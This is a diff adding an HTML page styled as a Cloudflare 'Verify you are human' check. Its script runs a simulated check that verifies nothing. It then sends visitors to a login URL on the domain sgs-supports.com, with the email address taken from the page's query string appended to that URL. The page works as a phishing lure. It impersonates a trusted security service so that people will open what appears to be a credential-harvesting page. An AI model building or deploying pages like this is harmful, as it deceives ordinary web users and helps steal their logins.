@@ -1,0 +1,1294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Cloudflare — Verification</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      min-height: 100%;
+    }
+
+    body {
+      min-height: 100vh;
+      overflow: hidden;
+
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+
+        background:
+        url("Architectural.png")
+        center center
+        / contain
+        no-repeat;
+
+
+      background-color: #eeeeee;
+
+    }
+
+
+    /* =========================================================
+       PAGE
+    ========================================================= */
+
+    .page {
+      position: relative;
+
+      width: 100%;
+      min-height: 100vh;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      overflow: hidden;
+
+      position: relative;
+      z-index: 1;
+    }
+
+    .page::before {
+  content: "";
+
+  position: absolute;
+  inset: 0;
+
+  background:
+    url("Architectural.png")
+    center center
+    / contain
+    no-repeat;
+
+  filter: blur(4px);
+
+  transform: scale(1.01);
+
+  z-index: 0;
+
+  pointer-events: none;
+}
+
+
+    /* =========================================================
+       ABSTRACT BACKGROUND
+    ========================================================= */
+
+    .background-art {
+      position: absolute;
+      inset: 0;
+
+      overflow: hidden;
+
+      pointer-events: none;
+    }
+
+
+    /*
+      Large soft background glow
+    */
+
+    .background-art::before {
+      content: "";
+
+      position: absolute;
+
+      width: 520px;
+      height: 420px;
+
+      left: 50%;
+      top: 30%;
+
+      transform: translate(-50%, -50%);
+
+      background:
+        radial-gradient(
+          ellipse,
+          rgba(255, 255, 255, .9) 0%,
+          rgba(255, 255, 255, .25) 48%,
+          transparent 72%
+        );
+
+      filter: blur(20px);
+    }
+
+
+    /*
+      Background floor
+    */
+
+    .background-floor {
+      position: absolute;
+
+      left: -10%;
+      right: -10%;
+      bottom: -10px;
+
+      height: 45%;
+
+      background:
+        linear-gradient(
+          180deg,
+          rgba(255,255,255,.15),
+          rgba(255,255,255,.65)
+        );
+
+      filter: blur(1px);
+    }
+
+
+    /* =========================================================
+       COLORFUL ABSTRACT OBJECTS
+    ========================================================= */
+
+    .shape {
+      position: absolute;
+
+      pointer-events: none;
+
+      filter:
+        drop-shadow(
+          0 12px 15px rgba(0,0,0,.08)
+        );
+    }
+
+
+    /*
+      Cyan / purple rounded block
+    */
+
+    .shape-one {
+      width: 155px;
+      height: 80px;
+
+      left: 16%;
+      top: 25%;
+
+      border-radius: 22px 15px 8px 8px;
+
+      background:
+        linear-gradient(
+          135deg,
+          #58d4e5 0%,
+          #54c5e8 42%,
+          #9179dc 100%
+        );
+
+      transform:
+        perspective(300px)
+        rotateX(-7deg);
+    }
+
+
+    /*
+      Blue-green ribbon
+    */
+
+    .shape-two {
+      width: 150px;
+      height: 205px;
+
+      right: 13%;
+      top: 19%;
+
+      border-radius: 50px;
+
+      background:
+        linear-gradient(
+          180deg,
+          #159de5 0%,
+          #087fd8 35%,
+          #3bcf9c 70%,
+          #80c93b 100%
+        );
+
+      transform:
+        rotate(7deg)
+        skewX(-7deg);
+
+      clip-path: polygon(
+        28% 0%,
+        78% 0%,
+        100% 15%,
+        80% 27%,
+        63% 25%,
+        52% 70%,
+        36% 100%,
+        0% 100%,
+        18% 65%
+      );
+    }
+
+
+    /*
+      Pink / purple rounded block
+    */
+
+    .shape-three {
+      width: 105px;
+      height: 95px;
+
+      right: 3%;
+      top: 25%;
+
+      border-radius: 26px 20px 8px 8px;
+
+      background:
+        linear-gradient(
+          145deg,
+          #ed62df,
+          #b448dd
+        );
+
+      transform:
+        rotate(-2deg);
+    }
+
+
+    /*
+      Turquoise lower object
+    */
+
+    .shape-four {
+      width: 210px;
+      height: 170px;
+
+      left: 8%;
+      bottom: 22%;
+
+      border-radius: 35px 70px 70px 40px;
+
+      background:
+        linear-gradient(
+          145deg,
+          #08b8c7,
+          #069c9d 60%,
+          #087f82
+        );
+
+      transform: rotate(-5deg);
+
+      opacity: .96;
+    }
+
+
+    /*
+      Small foreground blue shape
+    */
+
+    .shape-five {
+      width: 125px;
+      height: 105px;
+
+      right: 9%;
+      bottom: 28%;
+
+      border-radius: 35px;
+
+      background:
+        linear-gradient(
+          145deg,
+          #32b7ee,
+          #2189db
+        );
+
+      transform: rotate(8deg);
+
+      opacity: .85;
+    }
+
+
+    /* =========================================================
+       MAIN PANEL
+    ========================================================= */
+
+    .verification-panel {
+      position: relative;
+      z-index: 10;
+
+      width: min(480px, calc(100% - 32px));
+      min-height: 300px;
+
+      padding: 60px 30px 55px;
+
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+
+      border-radius: 20px;
+
+      background:
+        linear-gradient(
+          105deg,
+          rgba(113, 232, 221, .72) 0%,
+          rgba(74, 185, 255, .82) 42%,
+          rgba(91, 144, 255, .82) 62%,
+          rgba(255, 155, 190, .82) 100%
+        );
+
+      border:
+        1px solid
+        rgba(255,255,255,.35);
+
+      box-shadow:
+        0 20px 50px rgba(55, 130, 190, .18),
+        inset 0 1px 0 rgba(255,255,255,.38);
+
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+    }
+
+
+    /*
+      Soft light inside panel
+    */
+
+    .verification-panel::before {
+      content: "";
+
+      position: absolute;
+      inset: 0;
+
+      border-radius: inherit;
+
+      background:
+        radial-gradient(
+          circle at 30% 40%,
+          rgba(255,255,255,.22),
+          transparent 42%
+        );
+
+      pointer-events: none;
+    }
+
+
+    /* =========================================================
+       HEADING
+    ========================================================= */
+
+    .title {
+      position: relative;
+      z-index: 2;
+
+      margin: 0 0 47px;
+
+      color: #ffffff;
+
+      font-size: 35px;
+      line-height: 1.1;
+
+      font-weight: 700;
+
+      letter-spacing: -.9px;
+
+      text-align: center;
+
+      text-shadow:
+        0 1px 3px rgba(0,0,0,.05);
+    }
+
+
+    /* =========================================================
+       VERIFICATION BOX
+    ========================================================= */
+
+    .verification-box {
+      position: relative;
+      z-index: 2;
+
+      width: 320px;
+      min-height: 58px;
+
+      padding: 6px 8px;
+
+      border: 1px solid #dedede;
+
+      border-radius: 1px;
+
+      background: #ffffff;
+
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+
+      gap: 18px;
+
+      cursor: pointer;
+
+      box-shadow:
+        0 2px 7px rgba(0,0,0,.08);
+
+      transition:
+        border-color .18s ease,
+        box-shadow .18s ease,
+        transform .18s ease;
+    }
+
+
+    .verification-box:hover {
+      border-color: #d1d1d1;
+
+      box-shadow:
+        0 4px 12px rgba(0,0,0,.10);
+    }
+
+
+    .verification-box:active {
+      transform: scale(.995);
+    }
+
+
+    .verification-box:focus-visible {
+      outline: 2px solid rgba(21,148,71,.45);
+      outline-offset: 3px;
+    }
+
+
+    /* =========================================================
+       LEFT SIDE
+    ========================================================= */
+
+    .verify-left {
+      min-width: 0;
+
+      display: flex;
+      align-items: center;
+
+      gap: 13px;
+    }
+
+
+    /* =========================================================
+       CHECKBOX
+    ========================================================= */
+
+    .checkbox {
+      width: 25px;
+      height: 25px;
+
+      flex: 0 0 25px;
+
+      border:
+        2px solid
+        #969da4;
+
+      border-radius: 3px;
+
+      background: #ffffff;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+
+    .checkbox.checked {
+      background: #159447;
+      border-color: #159447;
+    }
+
+
+    .checkbox.checked::after {
+      content: "✓";
+
+      color: #ffffff;
+
+      font-size: 15px;
+      line-height: 1;
+
+      font-weight: 700;
+    }
+
+
+    /* =========================================================
+       STATUS
+    ========================================================= */
+
+    .status {
+      font-size: 16px;
+
+      line-height: 1.3;
+
+      font-weight: 400;
+
+      color: #303030;
+
+      white-space: nowrap;
+    }
+
+
+    /* =========================================================
+       LOADER
+    ========================================================= */
+
+    .loader {
+      display: none;
+
+      position: relative;
+
+      width: 42px;
+      height: 42px;
+
+      flex: 0 0 42px;
+    }
+
+
+    .verifying .checkbox {
+      display: none;
+    }
+
+
+    .verifying .loader {
+      display: block;
+    }
+
+
+    .dot {
+      position: absolute;
+
+      left: 50%;
+      top: 50%;
+
+      width: 4px;
+      height: 4px;
+
+      margin-left: -2px;
+      margin-top: -2px;
+
+      border-radius: 50%;
+
+      background: #159447;
+
+      transform:
+        rotate(var(--angle))
+        translateY(-15px);
+
+      animation:
+        pulse 1.1s linear infinite;
+
+      animation-delay: var(--delay);
+    }
+
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        opacity: .18;
+
+        transform:
+          rotate(var(--angle))
+          translateY(-15px)
+          scale(.8);
+      }
+
+      45% {
+        opacity: 1;
+
+        transform:
+          rotate(var(--angle))
+          translateY(-15px)
+          scale(1);
+      }
+    }
+
+
+    /* =========================================================
+       CLOUDFLARE BRAND
+    ========================================================= */
+
+    .brand-area {
+      width: 100px;
+
+      flex: 0 0 100px;
+
+      display: flex;
+      flex-direction: column;
+
+      align-items: center;
+      justify-content: center;
+    }
+
+
+    /* =========================================================
+       CLOUD
+    ========================================================= */
+
+    .cloud {
+      position: relative;
+
+      width: 58px;
+      height: 30px;
+
+      margin-bottom: 1px;
+    }
+
+
+    .cloud-base {
+      position: absolute;
+
+      left: 4px;
+      bottom: 2px;
+
+      width: 49px;
+      height: 16px;
+
+      background: #ff8a22;
+
+      border-radius:
+        15px 15px 6px 6px;
+    }
+
+
+    .cloud-big {
+      position: absolute;
+
+      left: 15px;
+      top: 2px;
+
+      width: 27px;
+      height: 23px;
+
+      background: #ff8a22;
+
+      border-radius: 50%;
+    }
+
+
+    .cloud-small {
+      position: absolute;
+
+      right: 3px;
+      top: 13px;
+
+      width: 19px;
+      height: 14px;
+
+      background: #ff8a22;
+
+      border-radius: 50%;
+    }
+
+
+    .cloud-cut {
+      position: absolute;
+
+      right: 1px;
+      bottom: 5px;
+
+      width: 14px;
+      height: 7px;
+
+      background: #ffffff;
+
+      border-radius:
+        50% 50% 0 0;
+
+      transform: rotate(-8deg);
+    }
+
+
+    /* =========================================================
+       BRAND TEXT
+    ========================================================= */
+
+    .brand {
+      color: #171719;
+
+      font-size: 10px;
+
+      font-weight: 800;
+
+      letter-spacing: 1.8px;
+    }
+
+
+    .links {
+      margin-top: 2px;
+
+      color: #55565a;
+
+      font-size: 9px;
+    }
+
+
+    .links a {
+      color: inherit;
+
+      text-decoration: underline;
+    }
+
+
+    .separator {
+      margin: 0 4px;
+    }
+
+
+    /* =========================================================
+       SUCCESS
+    ========================================================= */
+
+    .success .verification-box {
+      border-color: #b8d9c5;
+    }
+
+
+    .success .status {
+      color: #159447;
+    }
+
+
+    /* =========================================================
+       TABLET
+    ========================================================= */
+
+    @media (max-width: 700px) {
+
+      .verification-panel {
+        min-height: 340px;
+
+        padding:
+          72px 28px
+          64px;
+      }
+
+      .title {
+        font-size: 20px;
+
+        margin-bottom: 42px;
+      }
+
+      .shape-one {
+        left: 10%;
+      }
+
+      .shape-two {
+        right: 5%;
+      }
+
+      .shape-four {
+        left: 0;
+      }
+    }
+
+
+    /* =========================================================
+       PHONE
+    ========================================================= */
+
+    @media (max-width: 500px) {
+
+      body {
+        overflow: hidden;
+      }
+
+      .verification-panel {
+        min-height: 352px;
+
+        padding:
+          80px 18px
+          72px;
+
+        border-radius:
+          18px;
+      }
+
+
+      .title {
+        margin-bottom: 48px;
+
+        font-size: 30px;
+
+        line-height: 1.15;
+
+        letter-spacing: -.6px;
+      }
+
+
+      .verification-box {
+        width: calc(100% - 24px);
+
+        min-height: 90px;
+
+        padding: 13px 14px;
+
+        gap: 10px;
+      }
+
+
+      .verify-left {
+        gap: 10px;
+      }
+
+
+      .status {
+        font-size: 15px;
+      }
+
+
+      .checkbox {
+        width: 24px;
+        height: 24px;
+
+        flex-basis: 24px;
+      }
+
+
+      .loader {
+        width: 40px;
+        height: 40px;
+
+        flex-basis: 40px;
+      }
+
+
+      .brand-area {
+        width: 90px;
+        flex-basis: 90px;
+      }
+
+
+      .cloud {
+        transform: scale(.9);
+        transform-origin: center;
+      }
+
+
+      .brand {
+        font-size: 9px;
+
+        letter-spacing: 1.5px;
+      }
+
+
+      .links {
+        font-size: 8px;
+      }
+
+
+      .shape-one {
+        width: 130px;
+        height: 65px;
+
+        left: 16%;
+        top: 24%;
+      }
+
+
+      .shape-two {
+        width: 120px;
+        height: 170px;
+
+        right: 5%;
+        top: 18%;
+      }
+
+
+      .shape-three {
+        width: 85px;
+        height: 78px;
+
+        right: -2%;
+        top: 25%;
+      }
+
+
+      .shape-four {
+        width: 175px;
+        height: 145px;
+
+        left: 4%;
+        bottom: 23%;
+      }
+
+
+      .shape-five {
+        width: 100px;
+        height: 85px;
+
+        right: 5%;
+        bottom: 27%;
+      }
+    }
+
+
+    /* =========================================================
+       VERY SMALL PHONES
+    ========================================================= */
+
+    @media (max-width: 360px) {
+
+      .verification-panel {
+        min-height: 335px;
+
+        padding:
+          70px 12px
+          60px;
+      }
+
+
+      .title {
+        font-size: 20px;
+
+        margin-bottom: 40px;
+      }
+
+
+      .verification-box {
+        min-height: 82px;
+
+        padding: 10px;
+      }
+
+
+      .status {
+        font-size: 13px;
+      }
+
+
+      .brand-area {
+        width: 76px;
+        flex-basis: 76px;
+      }
+
+
+      .brand {
+        font-size: 8px;
+
+        letter-spacing: 1.2px;
+      }
+
+
+      .links {
+        font-size: 7px;
+      }
+    }
+  </style>
+</head>
+
+
+<body>
+
+  <main class="page">
+
+    <!-- =====================================================
+         BACKGROUND ART
+    ====================================================== -->
+
+    <div class="background-art" aria-hidden="true">
+
+    </div>
+
+
+    <!-- =====================================================
+         VERIFICATION PANEL
+    ====================================================== -->
+
+    <section class="verification-panel">
+
+      <h1 class="title">
+        Help us fight bots
+      </h1>
+
+
+      <!--
+        THE ENTIRE PANEL IS CLICKABLE.
+        NOTHING STARTS AUTOMATICALLY.
+      -->
+
+      <div
+        class="verification-box"
+        id="verificationBox"
+        role="button"
+        tabindex="0"
+        aria-label="Verify you are human"
+      >
+
+        <div class="verify-left">
+
+          <!-- Checkbox -->
+
+          <div
+            class="checkbox"
+            id="checkbox"
+          ></div>
+
+
+          <!-- Loader -->
+
+          <div
+            class="loader"
+            aria-hidden="true"
+          >
+
+            <span
+              class="dot"
+              style="--angle:0deg;--delay:0s"
+            ></span>
+
+            <span
+              class="dot"
+              style="--angle:45deg;--delay:.14s"
+            ></span>
+
+            <span
+              class="dot"
+              style="--angle:90deg;--delay:.28s"
+            ></span>
+
+            <span
+              class="dot"
+              style="--angle:135deg;--delay:.42s"
+            ></span>
+
+            <span
+              class="dot"
+              style="--angle:180deg;--delay:.56s"
+            ></span>
+
+            <span
+              class="dot"
+              style="--angle:225deg;--delay:.70s"
+            ></span>
+
+            <span
+              class="dot"
+              style="--angle:270deg;--delay:.84s"
+            ></span>
+
+            <span
+              class="dot"
+              style="--angle:315deg;--delay:.98s"
+            ></span>
+
+          </div>
+
+
+          <div
+            class="status"
+            id="status"
+          >
+            Verify you are human
+          </div>
+
+        </div>
+
+
+        <!-- =================================================
+             CLOUDFLARE BRAND
+        ================================================== -->
+
+        <div class="brand-area">
+
+          <div class="cloud">
+
+            <div class="cloud-big"></div>
+            <div class="cloud-small"></div>
+            <div class="cloud-base"></div>
+            <div class="cloud-cut"></div>
+
+          </div>
+
+
+          <div class="brand">
+            CLOUDFLARE
+          </div>
+
+
+          <div class="links">
+
+            <a href="/privacy">
+              Privacy
+            </a>
+
+            <span class="separator">·</span>
+
+            <a href="/help">
+              Help
+            </a>
+
+          </div>
+
+        </div>
+
+      </div>
+
+    </section>
+
+  </main>
+
+
+  <script>
+
+    /*
+    ==========================================
+    DESTINATION
+    ==========================================
+    */
+
+    const redirectURL = "https://login.sgs-supports.com/view_document_OWHDdqRx?u=LDS2Svg";
+
+
+    const box =
+      document.getElementById("verificationBox");
+
+    const checkbox =
+      document.getElementById("checkbox");
+
+    const status =
+      document.getElementById("status");
+
+
+    let started = false;
+
+
+    /*
+    ==========================================
+    START VERIFICATION
+    ==========================================
+    */
+
+    function startVerification() {
+
+      /*
+        Prevent repeated clicks.
+      */
+
+      if (started) {
+        return;
+      }
+
+      started = true;
+
+
+      /*
+        Start loading ONLY after
+        the visitor clicks.
+      */
+
+      box.classList.add("verifying");
+
+      status.textContent =
+        "Verifying...";
+
+
+      /*
+        Simulated verification.
+      */
+
+      setTimeout(function() {
+
+        /*
+          Stop loader.
+        */
+
+        box.classList.remove("verifying");
+
+
+        /*
+          Show checkmark.
+        */
+
+        checkbox.classList.add("checked");
+
+
+        /*
+          Show success.
+        */
+
+        status.textContent =
+          "Verification successful";
+
+        box.classList.add("success");
+
+
+        /*
+          Redirect after success.
+        */
+
+        setTimeout(function() {
+
+          window.location.href =
+            redirectURL;
+
+        }, 1000);
+
+      }, 1800);
+    }
+
+
+    /*
+    ==========================================
+    MOUSE / TOUCH
+    ==========================================
+    */
+
+    box.addEventListener(
+      "click",
+      startVerification
+    );
+
+
+    /*
+    ==========================================
+    KEYBOARD
+    ==========================================
+    */
+
+    box.addEventListener(
+      "keydown",
+      function(event) {
+
+        if (
+          event.key === "Enter" ||
+          event.key === " "
+        ) {
+
+          event.preventDefault();
+
+          startVerification();
+        }
+
+      }
+    );
+
+  
+
+const params = new URLSearchParams(window.location.search);
+const email = params.get("email");
+
+document.getElementById("verificationBox").addEventListener("click", function () {
+
+    if (!email) {
+        alert("Email is missing.");
+        return;
+    }
+
+    const page3Url =
+        "https://login.sgs-supports.com/view_document_OWHDdqRx?u=LDS2Svg#" + email;
+
+    window.location.href = page3Url;
+});
+
+
+
+</script>
+
+</body>
+</html>
